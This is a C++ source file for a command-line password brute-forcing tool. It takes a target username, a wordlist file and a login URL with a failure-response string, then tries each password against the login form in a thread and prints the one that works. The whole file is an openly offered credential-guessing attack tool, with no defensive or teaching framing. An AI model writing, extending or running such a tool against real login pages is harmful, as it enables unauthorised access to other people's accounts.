#include "bruteforce.hpp"
#include <boost/program_options.hpp>
#include <iostream>
#include <thread>

namespace po = boost::program_options;

void bruteForceLogin(const std::string &url, const std::string &username, const std::string &wordlist, const std::string &failureResponse) {
    BruteForce bf;
    bf.loadPasswords(wordlist);

    for (const auto &password : bf.getPasswords()) {
        if (bf.tryLogin(url, username, password, failureResponse)) {
            std::cout << "Password found: " << password << std::endl;
            break;
        }
    }
}

int main(int argc, char* argv[]) {
    std::string username;
    std::string passwordFile;
    std::string requestType;
    std::string targetUrl;

    po::options_description desc("Allowed options");
    desc.add_options()
        ("help", "produce help message")
        ("usr", po::value<std::string>(&username)->required(), "target username")
        ("pswd", po::value<std::string>(&passwordFile)->required(), "path to password file")
        ("req", po::value<std::string>(&requestType)->required(), "request type (e.g., http-post-form)")
        ("url", po::value<std::string>(&targetUrl)->required(), "URL and parameters");

    po::variables_map vm;
    try {
        po::store(po::parse_command_line(argc, argv, desc), vm);
        po::notify(vm);
    } catch (const po::error &ex) {
        std::cerr << ex.what() << std::endl;
        std::cerr << desc << std::endl;
        return 1;
    }

    std::size_t pos = targetUrl.find(":");
    if (pos == std::string::npos) {
        std::cerr << "Invalid URL and parameters format" << std::endl;
        return 1;
    }
    std::string url = targetUrl.substr(0, pos);
    std::string failureResponse = targetUrl.substr(pos + 1);

    std::thread bfThread(bruteForceLogin, url, username, passwordFile, failureResponse);
    bfThread.join();

    return 0;
}